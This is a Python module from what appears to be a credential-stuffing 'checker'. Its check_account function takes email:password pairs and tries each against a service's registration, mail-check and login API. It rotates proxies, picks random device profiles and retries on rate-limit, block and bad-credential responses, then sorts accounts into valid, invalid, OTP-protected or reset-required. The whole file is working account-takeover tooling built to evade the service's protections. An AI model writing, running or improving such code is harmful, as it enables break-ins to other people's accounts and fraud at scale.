import hashlib, random, time
from . import api
from .parser import parse
from .proxy import to_req
from .config import PROFILES


def blocked(err):
    if not err:
        return False
    e = str(err).lower()
    if e.startswith("reg_") and e not in ("reg_400", "reg_401"):
        return True
    if e.startswith("chk_") and e not in ("chk_400", "chk_401"):
        return True
    if e.startswith("login_") and e not in ("login_400", "login_401"):
        return True
    if "timeout" in e or "timed out" in e:
        return True
    if "connection" in e and "reset" in e:
        return True
    if "no_route" in e or "unreachable" in e:
        return True
    if e in ("no_token",):
        return True
    return False


def check_account(mail, pw, pm, debug=False, max_attempts=3, otp_retry=1):
    cc = "?"
    sid = hashlib.md5(mail.encode()).hexdigest()[:10]
    otp_seen = 0

    for attempt in range(max_attempts):
        try:
            if pm and pm.size() > 0:
                p = pm.next(sid=sid if attempt == 0 else None)
                if not p:
                    return {"account": mail + ":" + pw, "status": "UNKNOWN", "info": "no_proxy", "country": cc}
                px = to_req(p)
            else:
                p = None
                px = None
            prof = random.choice(PROFILES)

            if debug:
                pf = prof.get("os_name", "?")
                print("  [dbg] " + mail + ": try " + str(attempt + 1) + "/" + str(max_attempts) + " device=" + pf + " proxy=" + (p["host"] if p else "direct"), flush=True)

            tk, err = api.register(px, prof)
            if err:
                if debug: print("  [dbg] " + mail + ": register=" + err, flush=True)
                if p: pm.mark_failed(p)
                time.sleep(0.3 + random.random() * 0.4)
                continue

            ops, errs, err = api.check_mail(mail, tk, px, prof)
            if err:
                if debug: print("  [dbg] " + mail + ": check=" + err, flush=True)
                if p: pm.mark_failed(p)
                time.sleep(0.3 + random.random() * 0.4)
                continue

            if errs:
                tok_err = any("access-token" in str(e.get("message", "")).lower() for e in errs)
                if not tok_err:
                    if p: pm.mark_success(p)
                    return {"account": mail + ":" + pw, "status": "ERROR", "info": str(errs)[:60], "country": cc}
                if p: pm.mark_failed(p)
                time.sleep(0.3 + random.random() * 0.4)
                continue

            if ops is None:
                if p: pm.mark_failed(p)
                time.sleep(0.3 + random.random() * 0.4)
                continue

            if p: pm.mark_success(p)
            os_ = "|".join(ops) if isinstance(ops, list) else str(ops)

            if debug: print("  [dbg] " + mail + ": ops=" + os_, flush=True)

            if "Register" in os_ and "Login" not in os_ and "OTP" not in os_:
                return {"account": mail + ":" + pw, "status": "INVALID", "info": "not_registered", "country": cc}

            if "OTP" in os_ and "Login" not in os_:
                otp_seen += 1
                if otp_seen > otp_retry:
                    if attempt < max_attempts - 1:
                        if debug: print("  [dbg] " + mail + ": otp only retry new proxy", flush=True)
                        if p: pm.mark_failed(p)
                        time.sleep(0.4 + random.random() * 0.3)
                        continue
                    return {"account": mail + ":" + pw, "status": "OTP", "info": "otp_" + str(otp_seen - 1), "country": cc}
                if debug: print("  [dbg] " + mail + ": otp only try login anyway", flush=True)

            if "Login" in os_ or "OTP" in os_:
                res, err = api.login(mail, pw, tk, px, prof)
                if err:
                    if debug: print("  [dbg] " + mail + ": login=" + err, flush=True)
                    if p: pm.mark_failed(p)
                    time.sleep(0.3 + random.random() * 0.4)
                    continue

                es = res.get("errors", []) if res else []
                if es:
                    codes = [(e.get("extensions") or {}).get("code", "") for e in es]
                    msgs = [str(e.get("message", "")).lower() for e in es]
                    estr = str(es).lower()

                    if "idp.error.identity.bad-credentials" in codes:
                        if attempt < max_attempts - 1:
                            if debug: print("  [dbg] " + mail + ": bad creds retry new proxy", flush=True)
                            if p: pm.mark_failed(p)
                            time.sleep(0.4 + random.random() * 0.3)
                            continue
                        return {"account": mail + ":" + pw, "status": "INVALID", "info": "bad_credentials", "country": cc}

                    if "password-reset-required" in estr or "password_reset_required" in estr:
                        return {"account": mail + ":" + pw, "status": "RESET", "info": "password_reset_required", "country": cc}

                    if any("otp" in m or "verification" in m for m in msgs):
                        otp_seen += 1
                        if otp_seen > otp_retry:
                            if attempt < max_attempts - 1:
                                if debug: print("  [dbg] " + mail + ": login otp retry new proxy", flush=True)
                                if p: pm.mark_failed(p)
                                time.sleep(0.4 + random.random() * 0.3)
                                continue
                            return {"account": mail + ":" + pw, "status": "OTP", "info": "verification_required", "country": cc}
                        if debug: print("  [dbg] " + mail + ": login otp retry", flush=True)
                        continue

                    if any("blocked" in m or "rate limit" in m or "too many" in m for m in msgs):
                        if debug: print("  [dbg] " + mail + ": ip blocked retry new proxy", flush=True)
                        if p: pm.mark_failed(p)
                        time.sleep(0.5 + random.random() * 0.5)
                        continue

                    continue

                r = parse(res, cc)
                if r is None:
                    continue
                r["account"] = mail + ":" + pw
                return r

        except Exception as e:
            if debug: print("  [dbg] " + mail + ": exception " + str(e)[:50], flush=True)
            continue

    if otp_seen > 0:
        return {"account": mail + ":" + pw, "status": "OTP", "info": "otp_" + str(otp_seen), "country": cc}
    return {"account": mail + ":" + pw, "status": "UNKNOWN", "info": "tried_" + str(max_attempts), "country": cc}
